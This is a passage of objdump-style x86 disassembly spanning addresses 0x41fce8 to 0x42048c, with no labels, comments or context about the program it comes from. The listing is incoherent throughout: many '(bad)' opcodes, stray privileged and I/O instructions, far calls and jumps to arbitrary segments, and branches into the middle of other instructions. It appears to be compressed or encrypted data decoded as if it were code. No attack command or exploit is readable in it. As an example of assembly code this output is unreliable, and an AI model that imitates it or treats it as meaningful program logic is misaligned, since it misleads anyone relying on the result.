  41fce8:	scas   al,BYTE PTR es:[edi]
  41fce9:	test   eax,0x125f2445
  41fcee:	sar    dl,0x18
  41fcf1:	pop    esp
  41fcf2:	into   
  41fcf3:	inc    edi
  41fcf4:	push   edi
  41fcf5:	dec    edx
  41fcf6:	(bad)  ds:[edi-0x5503a3dc]
  41fcfd:	jno    0x41fd32
  41fcff:	xor    al,0xd9
  41fd01:	xchg   edi,eax
  41fd02:	mov    ds:0xd28c9417,al
  41fd07:	rcr    bl,0x74
  41fd0a:	xchg   DWORD PTR [edi-0x2a7a09cc],ecx
  41fd10:	push   cs
  41fd11:	inc    eax
  41fd12:	inc    eax
  41fd13:	sahf   
  41fd14:	or     edi,esi
  41fd16:	add    BYTE PTR [esi-0x18],bh
  41fd19:	jmp    0x41fd0d
  41fd1b:	jecxz  0x41fce3
  41fd1d:	rcl    BYTE PTR [esi-0x10],0x3e
  41fd21:	or     BYTE PTR [ecx-0xe0ea2f7],bl
  41fd27:	outs   dx,DWORD PTR ds:[esi]
  41fd28:	pushf  
  41fd29:	adc    DWORD PTR [ebp-0x6fdd0c3a],ecx
  41fd2f:	int    0xb7
  41fd31:	sub    DWORD PTR [ebx+0x71],ebp
  41fd34:	adc    eax,DWORD PTR ds:0xa5d6e071
  41fd3a:	call   0x7bff:0xd8c580c2
  41fd41:	addr16 jns 0x41fd7d
  41fd44:	add    BYTE PTR [ebp+0x6f],cl
  41fd47:	das    
  41fd48:	sahf   
  41fd49:	cmp    dl,dl
  41fd4b:	jbe    0x41fdca
  41fd4d:	loope  0x41fd19
  41fd4f:	fwait
  41fd50:	ret    
  41fd51:	stos   DWORD PTR es:[edi],eax
  41fd52:	pop    es
  41fd53:	mov    cl,0xbf
  41fd55:	cmp    eax,0xd9f0e536
  41fd5a:	pop    esi
  41fd5b:	jbe    0x41fd30
  41fd5d:	shl    BYTE PTR [edx],1
  41fd5f:	pop    ebp
  41fd60:	icebp  
  41fd61:	push   ecx
  41fd62:	outs   dx,BYTE PTR ds:[esi]
  41fd63:	jl     0x41fd43
  41fd65:	lea    esi,[esi+0x1a59be50]
  41fd6b:	popa   
  41fd6c:	xor    al,0xa5
  41fd6e:	sbb    DWORD PTR ds:0xa4f3c75b,edx
  41fd74:	pop    esp
  41fd75:	mov    ah,cl
  41fd77:	sbb    eax,0x4f8de484
  41fd7c:	jno    0x41fd1d
  41fd7e:	mul    BYTE PTR [ebx-0x45c5435a]
  41fd84:	jge    0x41fdf7
  41fd86:	dec    esp
  41fd87:	in     al,0xb9
  41fd89:	cli    
  41fd8a:	adc    ch,BYTE PTR [edi]
  41fd8c:	push   0xe18f88d4
  41fd91:	imul   edx,DWORD PTR [ebx+0x7c935c33],0x32
  41fd98:	pop    ecx
  41fd99:	shl    ebp,1
  41fd9b:	mov    dl,0xff
  41fd9d:	mov    BYTE PTR [edi+0x7c79112e],ch
  41fda3:	pop    eax
  41fda4:	pop    ds
  41fda5:	leave  
  41fda6:	loop   0x41fddc
  41fda8:	icebp  
  41fda9:	jno    0x41fd94
  41fdab:	fidivr WORD PTR [eax+ecx*1-0x56]
  41fdaf:	lock clc 
  41fdb1:	cmp    DWORD PTR [ebp+0x62],edi
  41fdb4:	iret   
  41fdb5:	and    dl,BYTE PTR [eax]
  41fdb7:	inc    eax
  41fdb8:	mov    al,ds:0x2b4040e7
  41fdbd:	or     dh,BYTE PTR [ecx-0x6d4ab60c]
  41fdc3:	add    eax,0xd893491e
  41fdc8:	ins    BYTE PTR es:[edi],dx
  41fdc9:	xor    BYTE PTR [ebx+0x7f8985eb],al
  41fdcf:	scas   eax,DWORD PTR es:[edi]
  41fdd0:	retf   
  41fdd1:	sbb    DWORD PTR [ecx],ecx
  41fdd3:	lea    ecx,[ebx+0x7]
  41fdd6:	pop    esi
  41fdd7:	mov    cl,0xe9
  41fdd9:	mov    al,0x7
  41fddb:	out    0x73,eax
  41fddd:	jne    0x41fdf8
  41fddf:	mov    ecx,DWORD PTR [edi+edi*8]
  41fde2:	fisttp QWORD PTR [ebx-0x6]
  41fde5:	test   al,0xff
  41fde7:	add    bl,BYTE PTR [ebp-0x39fdda08]
  41fded:	shl    DWORD PTR [edi],1
  41fdef:	scas   eax,DWORD PTR es:[edi]
  41fdf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fdf1:	and    DWORD PTR [edi+eiz*8-0x57b91d1],0x6bc3788a
  41fdfc:	mov    dh,BYTE PTR [edi-0x3e650ea9]
  41fe02:	imul   ebp,DWORD PTR [edx],0x564bc85d
  41fe08:	xor    dh,ch
  41fe0a:	jle    0x41fde7
  41fe0c:	ror    DWORD PTR [ebp-0x65abb7fa],0xbe
  41fe13:	shl    DWORD PTR [edx+0x12],0xf
  41fe17:	pop    esp
  41fe18:	test   eax,0x5a669612
  41fe1d:	ficomp DWORD PTR [eax+0x6d]
  41fe20:	test   DWORD PTR [ebp+0x1f5f6af],0x6e788e77
  41fe2a:	test   BYTE PTR [ebx+0x4949bb83],0x9b
  41fe31:	fcmovnbe st,st(4)
  41fe33:	paddd  mm0,mm7
  41fe36:	out    dx,al
  41fe37:	or     DWORD PTR [esi+edx*8+0x3826a142],edi
  41fe3e:	pop    ebx
  41fe3f:	cmc    
  41fe40:	add    al,0x18
  41fe42:	fmul   DWORD PTR [eax+0x113a36ee]
  41fe48:	adc    BYTE PTR [eax*1+0x37332f2b],al
  41fe4f:	mov    eax,0xdc210200
  41fe54:	stc    
  41fe55:	dec    esp
  41fe56:	xchg   ebp,ecx
  41fe58:	repz xchg edi,eax
  41fe5a:	sbb    DWORD PTR [ebp-0x9],ebx
  41fe5d:	into   
  41fe5e:	xor    eax,0xbf7744f9
  41fe63:	and    ch,BYTE PTR [eax]
  41fe65:	scas   eax,DWORD PTR es:[edi]
  41fe66:	(bad)  
  41fe68:	outs   dx,DWORD PTR ds:[esi]
  41fe69:	pusha  
  41fe6a:	sub    al,0xf4
  41fe6c:	call   0x65c:0x6aa823c5
  41fe73:	mov    cl,0x9b
  41fe75:	add    dl,BYTE PTR [eax+0x1d]
  41fe78:	pop    eax
  41fe79:	adc    ah,BYTE PTR [edi-0x1]
  41fe7c:	mov    ebp,0x11c6491b
  41fe81:	sub    eax,0xfb84a986
  41fe86:	dec    edx
  41fe87:	and    eax,0x4ff497e3
  41fe8c:	add    dl,BYTE PTR [edx-0x24]
  41fe8f:	repnz outs dx,DWORD PTR ds:[esi]
  41fe91:	stos   BYTE PTR es:[edi],al
  41fe92:	sbb    ecx,eax
  41fe94:	(bad)  
  41fe95:	out    0xdf,al
  41fe97:	and    al,0x2b
  41fe99:	fwait
  41fe9a:	add    dl,al
  41fe9c:	adc    bl,dl
  41fe9e:	in     al,dx
  41fe9f:	xor    eax,0xe6e517b8
  41fea4:	out    dx,al
  41fea5:	and    eax,0x3cb4690b
  41feaa:	stos   DWORD PTR es:[edi],eax
  41feab:	and    eax,0x1fda32c2
  41feb0:	out    0xfd,eax
  41feb2:	pop    edx
  41feb3:	sbb    dh,BYTE PTR [ecx]
  41feb5:	inc    eax
  41feb6:	pop    esp
  41feb7:	and    DWORD PTR [edi],ebx
  41feb9:	out    dx,eax
  41feba:	mov    edx,0x7c305954
  41febf:	push   edi
  41fec0:	mov    BYTE PTR [ebx-0x672976c2],bl
  41fec6:	sub    dh,BYTE PTR [ebp-0x5eebe79e]
  41fecc:	dec    eax
  41fecd:	mov    esi,0x22a6cd8f
  41fed2:	popa   
  41fed3:	fcomi  st,st(5)
  41fed5:	fidivr WORD PTR [esi]
  41fed7:	sbb    eax,DWORD PTR [edi]
  41fed9:	shr    DWORD PTR [edi],cl
  41fedb:	adc    al,0xbf
  41fedd:	xchg   BYTE PTR [ebx-0x6a625568],ch
  41fee3:	fidiv  WORD PTR [edx+edx*8-0x3a]
  41fee7:	lods   eax,DWORD PTR ds:[esi]
  41fee8:	push   0xe4872dfb
  41feed:	jbe    0x41ff49
  41feef:	jbe    0x41ff28
  41fef1:	mov    ah,0x2f
  41fef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fef4:	in     al,dx
  41fef5:	out    0x89,eax
  41fef7:	pop    ebp
  41fef8:	xchg   DWORD PTR [eax],esi
  41fefa:	jo     0x41ff55
  41fefc:	fsub   DWORD PTR [edx+0x4f]
  41feff:	sub    al,BYTE PTR [edi+edi*1-0x2353f968]
  41ff06:	ret    0x6336
  41ff09:	addr16 push eax
  41ff0b:	nop
  41ff0c:	daa    
  41ff0d:	xor    ah,dl
  41ff0f:	bound  ecx,QWORD PTR [esi]
  41ff11:	dec    ecx
  41ff12:	repnz pop ecx
  41ff14:	adc    eax,0x53c3188e
  41ff19:	gs mov edx,0xdd5a3537
  41ff1f:	xchg   edi,eax
  41ff20:	mov    ds:0xff22ed60,al
  41ff25:	adc    DWORD PTR [ebx-0x5c1dca4a],ebx
  41ff2b:	into   
  41ff2c:	lds    esp,FWORD PTR ss:[edx+esi*8]
  41ff30:	inc    eax
  41ff31:	sbb    BYTE PTR [eax],bh
  41ff33:	and    ch,bh
  41ff35:	daa    
  41ff36:	je     0x41ff22
  41ff38:	pop    ebp
  41ff39:	call   0xc06d7fd1
  41ff3e:	cmp    al,0x5d
  41ff40:	ret    
  41ff41:	and    ebx,DWORD PTR [eax]
  41ff43:	ins    DWORD PTR es:[edi],dx
  41ff44:	sub    edx,DWORD PTR [edi+0xb]
  41ff47:	call   0x6a39:0x9e0f5aac
  41ff4e:	mov    esp,cs
  41ff50:	mov    ebx,0xe937011f
  41ff55:	add    BYTE PTR [edi],0x2e
  41ff58:	sub    eax,0x1af19ea8
  41ff5d:	jne    0x41ff64
  41ff5f:	test   BYTE PTR [edx-0x5a],0xa6
  41ff63:	sti    
  41ff64:	fist   WORD PTR [ebx+esi*4-0x38]
  41ff68:	shr    DWORD PTR [eax+eax*4],0xa9
  41ff6c:	call   0x92c5c0bf
  41ff71:	out    dx,al
  41ff72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff73:	or     BYTE PTR [edx-0x3d],ch
  41ff76:	into   
  41ff77:	test   BYTE PTR [ecx-0x329c4883],cl
  41ff7d:	push   ecx
  41ff7e:	mov    ebx,0xc2243cc2
  41ff83:	enter  0xf7f9,0xd5
  41ff87:	and    ah,BYTE PTR [esi+0x79b56f28]
  41ff8d:	mov    eax,ds:0x18d8f473
  41ff92:	pop    ebp
  41ff93:	dec    ebp
  41ff94:	mov    edx,0x1a9f00c1
  41ff99:	jmp    0x31f8be26
  41ff9e:	cmp    eax,0xe6f5ce39
  41ffa3:	cmp    ax,0x4cb0
  41ffa7:	sub    al,0x6c
  41ffa9:	ret    
  41ffaa:	pop    esp
  41ffab:	ds pop eax
  41ffad:	sub    ebp,esp
  41ffaf:	dec    esp
  41ffb0:	std    
  41ffb1:	test   al,0x48
  41ffb3:	stos   BYTE PTR es:[edi],al
  41ffb4:	(bad)
  41ffba:	div    DWORD PTR [eax-0x7a30fa94]
  41ffc0:	into   
  41ffc1:	cmc    
  41ffc2:	jns    0x41ff6c
  41ffc4:	mov    bl,0x3e
  41ffc6:	xchg   BYTE PTR [ebx],al
  41ffc8:	jl     0x41ff4b
  41ffca:	(bad)  
  41ffcb:	ins    DWORD PTR es:[edi],dx
  41ffcc:	adc    edi,DWORD PTR [edx+0x0]
  41ffcf:	mov    eax,0xed8cc495
  41ffd4:	xor    BYTE PTR [ecx],bh
  41ffd6:	inc    esi
  41ffd7:	(bad)  
  41ffd8:	sahf   
  41ffd9:	aad    0x6b
  41ffdb:	enter  0xffe7,0xfb
  41ffdf:	or     al,0xe3
  41ffe1:	jg     0x41ffa1
  41ffe3:	jnp    0x42003b
  41ffe5:	fnstcw WORD PTR [eax+0x5c2c1b1c]
  41ffeb:	(bad)
  41fff0:	js     0x41ffac
  41fff2:	(bad)  
  41fff3:	xchg   esi,eax
  41fff4:	icebp  
  41fff5:	jmp    0x41ffde
  41fff7:	(bad)  
  41fff8:	pop    edi
  41fff9:	jbe    0x41fff6
  41fffb:	push   cs
  41fffc:	test   eax,0x843e363c
  420001:	test   eax,0x1e00b1a1
  420006:	test   BYTE PTR ds:[edx],0x86
  42000a:	xor    al,0xbe
  42000c:	or     esp,DWORD PTR [ebx-0x6d]
  42000f:	cmp    eax,DWORD PTR [ecx+0x4fd0ac36]
  420015:	jbe    0x42003e
  420017:	push   0x32
  420019:	ret    
  42001a:	retf   0xa503
  42001d:	int    0xb0
  42001f:	adc    ebp,DWORD PTR [edi]
  420021:	mov    esi,0x85d1f5ff
  420026:	test   BYTE PTR [esi-0x5b],bl
  420029:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42002a:	add    BYTE PTR [ebx-0x6f],0x85
  42002e:	inc    edx
  42002f:	push   cs
  420030:	scas   eax,DWORD PTR es:[edi]
  420031:	mov    al,ds:0xa2a8e29
  420036:	cwde   
  420037:	retf   
  420038:	sub    bl,bl
  42003a:	test   eax,0x6cdf947d
  42003f:	shl    DWORD PTR [esi-0x1f63d831],0x94
  420046:	fsub   DWORD PTR [ebx]
  420048:	cmp    al,cl
  42004a:	mov    ecx,0x4b45215f
  42004f:	out    dx,eax
  420050:	mov    esi,0xe031394e
  420055:	pop    edi
  420056:	icebp  
  420057:	add    edx,DWORD PTR [ebx+eiz*1]
  42005a:	push   ss
  42005b:	xchg   ebp,eax
  42005c:	inc    edi
  42005d:	pop    eax
  42005e:	dec    ebx
  42005f:	xchg   ecx,eax
  420060:	and    BYTE PTR ds:0x903d5181,0x5e
  420067:	repnz les esp,FWORD PTR [esi+eax*1]
  42006b:	cmp    eax,0x825a1631
  420070:	pop    esi
  420071:	push   ss
  420072:	push   cs
  420073:	push   esp
  420074:	cwde   
  420075:	or     eax,0xa5884a25
  42007a:	pop    ebx
  42007b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42007c:	jg     0x42006d
  42007e:	pop    ebp
  42007f:	jb     0x420067
  420081:	bound  esp,QWORD PTR [edx+0x7b]
  420084:	add    BYTE PTR [edx],dh
  420086:	xchg   ebx,eax
  420087:	jmp    0x4200d1
  420089:	jne    0x4200a2
  42008b:	cmovl  edx,DWORD PTR [ecx]
  42008e:	inc    edi
  42008f:	inc    ecx
  420090:	mov    al,ds:0x69f69f2a
  420095:	(bad)  
  420096:	pushf  
  420097:	xor    DWORD PTR [eax],esi
  420099:	cmp    DWORD PTR [edx+0x77],esi
  42009c:	push   ss
  42009d:	fs inc eax
  42009f:	(bad)  [ebp-0x69]
  4200a2:	in     al,dx
  4200a3:	dec    ebp
  4200a4:	stos   DWORD PTR es:[edi],eax
  4200a5:	shl    DWORD PTR [edx-0x59],1
  4200a8:	sub    DWORD PTR [esi-0x6407de8e],esp
  4200ae:	mov    edx,DWORD PTR [ecx]
  4200b0:	cmp    ecx,DWORD PTR [ecx-0x67]
  4200b3:	inc    esi
  4200b4:	js     0x420046
  4200b6:	scas   al,BYTE PTR es:[edi]
  4200b7:	mov    al,ds:0x4d792f5d
  4200bc:	add    eax,0x41b29671
  4200c1:	jecxz  0x4200b2
  4200c3:	add    DWORD PTR [ebx],eax
  4200c5:	jne    0x420100
  4200c7:	imul   ebp,DWORD PTR [edi-0x1914d937],0xf0ec821d
  4200d1:	ror    DWORD PTR [ebx+0x62a55cd8],0x67
  4200d8:	mov    ds:0xdcb1f010,al
  4200dd:	or     BYTE PTR [eax],ah
  4200df:	mov    esp,0x13eecdbe
  4200e4:	sub    DWORD PTR [esi],ebx
  4200e6:	aas    
  4200e7:	popf   
  4200e8:	and    ecx,DWORD PTR [ecx-0x75f86356]
  4200ee:	add    ebp,DWORD PTR [edx-0x21e37cff]
  4200f4:	push   ebp
  4200f5:	inc    edx
  4200f6:	mov    DWORD PTR [edi],0x7677db61
  4200fc:	(bad)  
  4200fd:	stos   BYTE PTR es:[edi],al
  4200fe:	mov    dl,0x95
  420100:	pop    ebp
  420101:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420102:	retf   
  420103:	es iret 
  420105:	scas   eax,DWORD PTR es:[edi]
  420106:	in     al,dx
  420107:	jnp    0x420163
  420109:	mov    edi,0x232673f9
  42010e:	sbb    dh,bl
  420110:	dec    ebx
  420111:	push   edi
  420112:	out    dx,al
  420113:	jmp    0xf4b8:0xac3988f6
  42011a:	inc    esi
  42011b:	dec    eax
  42011c:	jle    0x4200e5
  42011e:	in     eax,0x54
  420120:	js     0x420128
  420122:	add    al,0x63
  420124:	or     DWORD PTR [eax-0x1365d126],ecx
  42012a:	inc    edx
  42012b:	ins    BYTE PTR es:[edi],dx
  42012c:	enter  0x5ec5,0x9a
  420130:	js     0x42011a
  420132:	test   eax,0xd40a5bd5
  420137:	in     eax,dx
  420138:	cmp    BYTE PTR [ebp-0x2419ea89],0x17
  42013f:	outs   dx,DWORD PTR ds:[esi]
  420140:	mov    bl,0x4c
  420142:	imul   BYTE PTR [edi]
  420144:	mov    al,0x52
  420146:	jno    0x42011f
  420148:	ja     0x42019d
  42014a:	es sti 
  42014c:	adc    al,0x31
  42014e:	and    ch,BYTE PTR [esi-0xeea0c18]
  420154:	int    0x93
  420156:	fwait
  420157:	lds    esp,FWORD PTR [ecx+ebp*2]
  42015a:	push   0xffffffec
  42015c:	loope  0x420143
  42015e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42015f:	retf   
  420160:	mov    bh,BYTE PTR [ebx-0x4e]
  420163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420164:	test   al,0xeb
  420166:	mov    ?,edx
  420168:	(bad)  
  420169:	sbb    ecx,esi
  42016b:	scas   eax,DWORD PTR es:[edi]
  42016c:	sub    DWORD PTR [ebp-0x15526f6f],esp
  420172:	in     al,0x12
  420174:	jb     0x420171
  420176:	inc    ecx
  420177:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420178:	mov    edi,0x7f3f8087
  42017d:	inc    edi
  42017e:	mov    ebp,ebx
  420180:	fwait
  420181:	bound  edx,QWORD PTR [edx+esi*4]
  420184:	or     DWORD PTR [edi-0x5012e583],0xf97b0ce0
  42018e:	js     0x4201cd
  420190:	mov    al,0xea
  420192:	sub    dh,BYTE PTR [ebp+0x13]
  420195:	enter  0xc272,0x3a
  420199:	mov    esi,ds
  42019b:	xor    eax,DWORD PTR [ebp-0x3b7d0efa]
  4201a1:	xchg   edx,eax
  4201a2:	je     0x420151
  4201a4:	cdq    
  4201a5:	push   ss
  4201a6:	pop    es
  4201a7:	test   eax,0xa3a1a80c
  4201ac:	cli    
  4201ad:	inc    ebp
  4201ae:	pop    ds
  4201af:	jo     0x4201b6
  4201b1:	jmp    0x12f7071b
  4201b6:	xlat   BYTE PTR ds:[ebx]
  4201b7:	sbb    DWORD PTR [eax-0x1],ebp
  4201ba:	adc    eax,0xb
  4201bd:	adc    dl,BYTE PTR [ebx+0x57964263]
  4201c3:	pop    ss
  4201c4:	jb     0x42018d
  4201c6:	jno    0x420184
  4201c8:	sbb    ebx,edi
  4201ca:	ds lock cmp ebp,edx
  4201ce:	mov    al,0x72
  4201d0:	mov    ch,0x12
  4201d2:	clc    
  4201d3:	jg     0x420217
  4201d5:	repz fwait
  4201d7:	and    bh,BYTE PTR [esi]
  4201d9:	gs ret 0xf065
  4201dd:	adc    ah,al
  4201df:	xchg   DWORD PTR [edi+0x11],ebp
  4201e2:	aam    0x7
  4201e4:	push   ss
  4201e5:	dec    edx
  4201e6:	xchg   DWORD PTR [ebx],eax
  4201e8:	or     cl,dl
  4201ea:	push   cs
  4201eb:	and    DWORD PTR [ecx+0x6b],ebp
  4201ee:	sbb    esi,ecx
  4201f0:	shl    BYTE PTR [ecx-0x16],cl
  4201f3:	push   ebp
  4201f4:	jb     0x420180
  4201f6:	jno    0x420259
  4201f8:	mov    ebp,0xf8e230d0
  4201fd:	test   eax,0xbacecd30
  420202:	adc    DWORD PTR [ebp-0x3ac426be],0xffffffea
  420209:	mov    ebp,0x32fe440b
  42020e:	inc    eax
  42020f:	imul   BYTE PTR [esi]
  420211:	adc    edx,DWORD PTR [edx+0x232426cf]
  420217:	or     DWORD PTR [edi-0x31],ebx
  42021a:	dec    eax
  42021b:	(bad)  
  42021c:	fsubr  st,st(1)
  42021e:	les    ecx,FWORD PTR [ecx+0x12]
  420221:	pop    esp
  420222:	mov    eax,0xfc27321f
  420227:	or     eax,0x3f767d9
  42022c:	imul   ebx,DWORD PTR [ecx],0x3b
  42022f:	into   
  420230:	lahf   
  420231:	mov    esp,0x69e0203c
  420236:	sub    dh,BYTE PTR [ebp-0x48]
  420239:	sub    eax,0xc77d7da4
  42023e:	sub    DWORD PTR [ecx-0x7a],eax
  420241:	xor    DWORD PTR [edx],ecx
  420243:	mov    cl,0x40
  420245:	dec    edi
  420246:	icebp  
  420247:	mov    ds:0xaad86a03,eax
  42024c:	dec    ebx
  42024d:	enter  0x24c5,0xcc
  420251:	sub    ch,BYTE PTR [edi+eiz*2+0x52ba119e]
  420258:	clc    
  420259:	push   edx
  42025a:	aaa    
  42025b:	sub    al,0x13
  42025d:	mov    ds:0xde44f41d,eax
  420262:	call   0xf94:0x1b6ed307
  420269:	push   cs
  42026a:	or     BYTE PTR [edi+eax*4+0x6905c4e4],cl
  420271:	pop    es
  420272:	fwait
  420273:	stc    
  420274:	add    bl,BYTE PTR [edx-0x67]
  420277:	jg     0x4202ba
  420279:	sbb    BYTE PTR [ecx-0x51c62793],0x62
  420280:	jmp    0x4202af
  420282:	or     al,0xc4
  420284:	inc    edx
  420285:	sbb    BYTE PTR [edi+eax*4+0x12d372b6],dl
  42028c:	pop    esp
  42028d:	inc    edi
  42028e:	xchg   edx,eax
  42028f:	inc    ebx
  420290:	ja     0x4202ee
  420292:	mov    dh,0x4
  420294:	mov    esp,0x3109839
  420299:	mov    ah,0x3
  42029b:	xchg   ebp,eax
  42029c:	mov    WORD PTR [ebx],cs
  42029e:	jl     0x4202bc
  4202a0:	inc    eax
  4202a1:	into   
  4202a2:	inc    edx
  4202a3:	sbb    BYTE PTR [eax-0x5c7f418b],ah
  4202a9:	lea    ecx,ds:0xfc13de03
  4202af:	mov    ds:0xcad22c44,eax
  4202b4:	inc    esp
  4202b5:	add    ebx,ebx
  4202b7:	push   ebx
  4202b8:	push   ebx
  4202b9:	inc    DWORD PTR ds:0x73e017c
  4202bf:	cdq    
  4202c0:	sbb    BYTE PTR ds:0xff80191b,0xa0
  4202c7:	mov    ecx,fs
  4202c9:	xor    ebp,DWORD PTR [esi]
  4202cb:	inc    DWORD PTR [esi+ecx*8-0x43eb3390]
  4202d2:	iret   
  4202d3:	jb     0x4202fb
  4202d5:	pushf  
  4202d6:	icebp  
  4202d7:	jp     0x4202a5
  4202d9:	push   DWORD PTR [esi-0xd]
  4202dc:	push   esp
  4202dd:	push   edi
  4202de:	std    
  4202df:	and    BYTE PTR [eax+0x4d],0xc6
  4202e3:	repz fstp DWORD PTR [esi+0x2]
  4202e7:	hlt    
  4202e8:	or     al,0xe2
  4202ea:	in     eax,0x3d
  4202ec:	push   esi
  4202ed:	(bad)  
  4202ee:	jno    0x4202b7
  4202f0:	mov    eax,0x581d317f
  4202f5:	adc    al,0x40
  4202f7:	fidivr WORD PTR [edi-0x62]
  4202fa:	add    al,0x16
  4202fc:	ins    BYTE PTR es:[edi],dx
  4202fd:	sti    
  4202fe:	outs   dx,DWORD PTR ds:[esi]
  4202ff:	cdq    
  420300:	mov    eax,ds:0x8745d34e
  420305:	in     al,0x3b
  420307:	lea    eax,[eax+0x7]
  42030a:	iret   
  42030b:	and    al,0xba
  42030d:	in     al,0x3
  42030f:	mov    bl,0xfa
  420311:	fisubr WORD PTR [ebx]
  420313:	sbb    eax,0x9c9b02f
  420318:	inc    esp
  420319:	push   cs
  42031a:	test   eax,0xee0e5e9f
  42031f:	ficom  DWORD PTR [ecx+0x2]
  420322:	push   ebp
  420323:	(bad)  
  420324:	pop    ecx
  420325:	pop    ebx
  420326:	call   0xed48:0xf59c7115
  42032d:	ds jae 0x420325
  420330:	inc    edi
  420331:	shr    cl,0x5c
  420334:	fadd   QWORD PTR [edi+0x46b26e59]
  42033a:	inc    ecx
  42033b:	(bad)  
  42033c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42033d:	iret   
  42033e:	inc    esp
  420340:	pop    eax
  420341:	jbe    0x4202c9
  420343:	jg     0x420377
  420345:	repz dec si
  420348:	nop
  420349:	out    0x54,al
  42034b:	lds    ebx,FWORD PTR [ebx+ecx*2+0x4f]
  42034f:	push   0x372c23c2
  420354:	xchg   esi,eax
  420355:	cwde   
  420356:	jmp    0x702a6c4d
  42035b:	inc    ebp
  42035c:	cmp    eax,0xc7872115
  420361:	or     BYTE PTR [eax-0x4c],cl
  420364:	aaa    
  420365:	push   ebp
  420366:	jno    0x4202ea
  420368:	xchg   ebx,eax
  420369:	jbe    0x4203d0
  42036b:	clc    
  42036c:	push   ebp
  42036d:	jbe    0x42038b
  42036f:	jb     0x4203be
  420371:	sub    ebx,DWORD PTR [edx]
  420373:	and    eax,0x6427fb8e
  420378:	push   0xffffffcf
  42037a:	dec    ebp
  42037b:	jbe    0x4203f6
  42037d:	xchg   ecx,eax
  42037e:	add    ch,BYTE PTR [esi+0x548494ad]
  420384:	and    DWORD PTR [eax],0x7e
  420387:	data16 ja 0x420335
  42038a:	pop    ebx
  42038b:	mov    WORD PTR [ebx-0x42],es
  42038e:	xor    eax,DWORD PTR [edx+0x5b]
  420391:	sub    BYTE PTR [ebp+0x24],ch
  420394:	inc    esp
  420395:	ss jecxz 0x4203eb
  420398:	cdq    
  420399:	in     al,dx
  42039a:	push   ecx
  42039b:	xlat   BYTE PTR ds:[ebx]
  42039c:	outs   dx,BYTE PTR ds:[esi]
  42039d:	mov    al,0x4
  42039f:	or     bl,cl
  4203a1:	push   edi
  4203a2:	in     eax,dx
  4203a3:	outs   dx,DWORD PTR ds:[esi]
  4203a4:	jno    0x4203fa
  4203a6:	inc    esi
  4203a7:	inc    BYTE PTR [edx-0x36]
  4203aa:	fstp   TBYTE PTR [ebx+0x59]
  4203ad:	icebp  
  4203ae:	shl    BYTE PTR [ecx],0xb2
  4203b1:	and    DWORD PTR [edx+edi*2],ecx
  4203b4:	xor    cl,bh
  4203b6:	les    eax,FWORD PTR [eax-0x28]
  4203b9:	inc    ah
  4203bb:	repnz lods eax,DWORD PTR ds:[esi]
  4203bd:	xor    ch,0x35
  4203c0:	jmp    0xbdd4:0x68c288e6
  4203c7:	daa    
  4203c8:	mov    cl,BYTE PTR [ebx+0x47]
  4203cb:	lods   al,BYTE PTR ds:[esi]
  4203cc:	cmp    BYTE PTR [esi],al
  4203ce:	adc    ebp,DWORD PTR [eax-0x6]
  4203d1:	cmp    DWORD PTR [ecx+edx*2+0x7fdb7afa],edi
  4203d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4203d9:	jle    0x4203a8
  4203db:	inc    ebp
  4203dc:	sbb    DWORD PTR [edi],0x73925f80
  4203e2:	push   ss
  4203e3:	inc    esp
  4203e4:	ja     0x420402
  4203e6:	in     al,dx
  4203e7:	sub    BYTE PTR [esi+edi*2-0x57],al
  4203eb:	xchg   ecx,eax
  4203ec:	shl    esi,cl
  4203ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203ef:	pushf  
  4203f0:	mov    ebx,0xe6e1c75f
  4203f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4203f6:	push   esp
  4203f7:	sbb    ch,BYTE PTR [edx]
  4203f9:	aaa    
  4203fa:	sbb    al,0x4e
  4203fc:	mov    edx,DWORD PTR [edi-0x5daa647c]
  420402:	pop    eax
  420403:	test   esi,ebp
  420405:	js     0x42042d
  420407:	out    dx,eax
  420408:	in     al,0x6b
  42040a:	pop    ebx
  42040b:	outs   dx,DWORD PTR ds:[esi]
  42040c:	jle    0x4203a9
  42040e:	adc    cl,dl
  420410:	sbb    DWORD PTR [edx-0x67],ebx
  420413:	in     al,dx
  420414:	aam    0x4d
  420416:	push   0xffffffc1
  420418:	icebp  
  420419:	sub    al,0x34
  42041b:	add    cl,dl
  42041d:	gs or  eax,eax
  420420:	out    0x90,al
  420422:	jno    0x420494
  420424:	xchg   edi,eax
  420425:	sbb    eax,0xc140d528
  42042a:	maskmovq mm4,(bad)
  42042b:	mul    DWORD PTR [ebp-0x16]
  42042e:	sbb    al,0x3f
  420430:	mov    eax,0xb03d5c4
  420435:	sub    DWORD PTR [edi+ebx*1+0x15],esi
  420439:	jnp    0x4204a1
  42043b:	call   0x7701:0x4e0592d4
  420442:	fs ins DWORD PTR es:[edi],dx
  420444:	pop    edi
  420445:	mov    al,0x38
  420447:	sbb    bh,BYTE PTR [ebp-0x4b]
  42044a:	push   ebx
  42044b:	addr16 gs (bad) 
  42044e:	mov    edx,0x3a62048c
  420453:	(bad)  
  420454:	cmp    BYTE PTR [ebx],al
  420456:	ds adc al,0x9c
  420459:	(bad)  
  42045a:	sti    
  42045b:	in     al,0x66
  42045d:	xor    ah,bh
  42045f:	out    0x8e,eax
  420461:	push   0xcc7fd3c9
  420466:	out    0xe,al
  420468:	pop    ecx
  420469:	retf   
  42046a:	add    eax,0x1b184213
  42046f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420470:	mov    bl,0x92
  420472:	and    al,0x2f
  420474:	inc    ecx
  420475:	xor    al,0xfa
  420477:	cwde   
  420478:	paddb  mm3,QWORD PTR [esi-0x3cf0cea5]
  42047f:	stos   DWORD PTR es:[edi],eax
  420480:	loopne 0x4204c2
  420482:	mov    cl,0xe4
  420484:	lods   al,BYTE PTR ds:[esi]
  420485:	int    0x43
  420487:	mov    ds:0x2aebf3c2,al
  42048c:	lea    ebp,[edx]
